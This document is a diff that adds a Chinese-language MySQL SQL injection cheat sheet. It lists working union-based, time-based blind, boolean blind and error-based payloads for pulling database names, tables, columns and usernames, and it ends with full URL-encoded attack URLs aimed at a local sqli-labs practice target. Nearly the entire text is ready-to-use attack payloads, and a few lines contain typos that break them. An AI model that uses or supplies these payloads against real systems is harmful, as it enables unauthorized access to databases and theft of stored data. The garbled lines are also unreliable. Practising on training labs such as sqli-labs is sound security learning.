@@ -1,0 +1,51 @@
+mysql注入
+
+and 1=1 #返回正常
+and 1=2 #返回错误
+order by x #猜长度
+0 union select 1,2,3,4,5,6,7 #获取位数
+0 union select 1,database(),version(),4,5,6,7 #获取数据库名和版本
+0 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema="数据库名" limit 0,1 #获取表名
+0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="表名" limit 0,1 #获取列名
+0 union select 1,字段名,3,4,5,6,7 from 表名 #获取数据
+
+mysql时间盲注
+
+and sleep(if((1=1),1,4)) # 1秒运行时间
+and sleep(if((1=2),1,4)) #返回4秒运行时间
+and sleep(if((length(database())=1),1,4)) #判断数据库长度
+and sleep(if((left(database(),1)="s"),1,4)) #猜解数据库名
+and sleep(if((1=(select count(table_name) from information_schema.tables where table_schema="security")),1,4)) #获取表的个数
+and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema-"security" limit 0,1),1,1))),1,4)) #猜解表的长度
+and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=114),1,4)) #以ascii码来猜解表名
+and sleep(if((1=(select count(column_name) from information_schema.columns where table_name="users")),1,4)) #获取列名个数
+and sleep(if((ascii(substr((select column_name from information_schema.colmns where table_name="users" limit 0,1),1,1))),1,4)) #获取列的长度
+and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))=182),1,4)) #用ascii猜解列名
+and sleep(if((1=(select username from users)),1,4)) #猜解字段个数
+and sleep(if((ascii(substr((select username from users limit 0,1),1,1))),1,4)) #猜解长度
+and sleep(if((ascii(substr((select username from users limit 0,1),1,1))=101),1,4)) #获取字段内容
+
+mysql布尔盲注
+
+and (length(database())=1) # 猜数据库名长度
+and (left(database(),1)="s") #猜数据库名
+and (1=(select count(table_name) from information_schema.tables where table_schema="security")) #猜解表名的个数
+and ascii(substr((select  table_name from information_schema.tables where table_schema="security" limit 0,1 ),1,1)) #猜解表的长度
+and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=101 #猜解表名
+and (1=(select count(column_name) from information_schema.columns where table_name="users")) #猜解制定列名个数
+and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1)) #猜解列名长度
+and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))=113 #猜解列名
+and (1=(select count(username) from users)) #猜解字段个数
+and ascii(substr((select username from users limit 0,1),1,1)) #猜解长度
+and ascii(substr((select username from users limit 0,1),1,1))=112 #猜解字段
+
+mysql 报错注入
+
+and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)
+
+将报错语句改为你输入的语句
+例如：
+读取username字段 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select%20username%20from%20users%20limit%200,1))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
+获取用户名 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select user()))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
+获取数据库名 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select database()))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
+
